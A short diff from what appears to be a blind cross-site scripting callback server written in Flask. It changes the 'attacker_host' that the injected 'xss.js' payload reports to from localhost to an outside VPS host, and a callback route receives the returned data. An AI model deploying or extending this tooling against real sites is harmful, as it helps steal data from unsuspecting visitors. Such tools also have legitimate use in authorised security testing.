@@ -83,7 +83,7 @@ def api(data,pingback_id):
 
 @app.route("/<path:user_id>/x.js")
 def bXSS(user_id):
-    attacker_host="http://localhost:5000"
+    attacker_host="http://vps219573.vps.ovh.ca:1337"
     return Response(render_template('xss.js', attacker_host=attacker_host, uid=user_id), mimetype='text/javascript')
 
 @app.route("/js_callback", methods=["POST"])
